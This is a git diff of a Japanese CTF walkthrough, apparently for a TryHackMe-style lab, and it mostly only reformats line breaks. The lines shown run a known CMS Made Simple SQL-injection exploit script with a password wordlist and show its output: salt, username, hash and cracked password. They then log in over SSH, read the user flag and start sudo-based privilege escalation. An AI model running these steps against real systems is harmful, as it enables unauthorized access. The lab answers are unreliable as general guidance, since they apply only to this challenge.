@@ -251,14 +251,14 @@ Options:
 また、今までpython3で実行していたが、lib2to3を使用して文字列の修正やエンコードの修正だけでなく、
 そのほかにもいろいろと修正しなければならなかったため、時間を考え最終的にpython2で実行した。
 
-Python2 用の termcolorが入っていなかったのでwgetで取得しインストールした。
-
-python2 46635.py -u http://10.49.141.85/simple --crack -w /usr/share/wordlists/rockyou.txt
-[+] Salt for password found: 1dac0d92e9fa6bb2
-[+] Username found: mitch
-[+] Email found: admin@admin.com
-[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
-[+] Password cracked: secret
+Python2 用の termcolorが入っていなかったのでwgetで取得しインストールした。  
+以下python2でのクラックコマンドとその結果  
+python2 46635.py -u http://10.49.141.85/simple --crack -w /usr/share/wordlists/rockyou.txt  
+[+] Salt for password found: 1dac0d92e9fa6bb2  
+[+] Username found: mitch  
+[+] Email found: admin@admin.com  
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96  
+[+] Password cracked: secret  
 
 ```
 </details>
@@ -269,20 +269,20 @@ python2 46635.py -u http://10.49.141.85/simple --crack -w /usr/share/wordlists/r
 ## 6 **Where can you login with the details obtained?**  
 問１で調査したnmap結果からsshと回答  
 ssh -p 2222 mitch@IP (ポート指定しないとつながらない)　
-※ポート指定しないとデフォルトの22につなごうとしてしまう
+※ポート指定しないとデフォルトの22につなごうとしてしまう  
 
 ## 7 **What's the user flag?**
-問6で侵入後、lsした際にuser.txtがあったため、それをcatした。
-$ cat user.txt
-G00d j0b, keep up!
+問6で侵入後、lsした際にuser.txtがあったため、それをcatした。  
+$ cat user.txt  
+G00d j0b, keep up!  
 
 ## 8 **Is there any other user in the home directory? What's its name?**  
-$ cd /home
-$ ls -l
-total 8
-drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
-drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath  
-上記コマンド結果よりsunbathと回答。
+$ cd /home  
+$ ls -l  
+total 8  
+drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch  
+drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath     
+上記コマンド結果よりsunbathと回答。  
 
 ## 9 **What can you leverage to spawn a privileged shell?**
 権限昇格するために初めにsudo -l を実施  
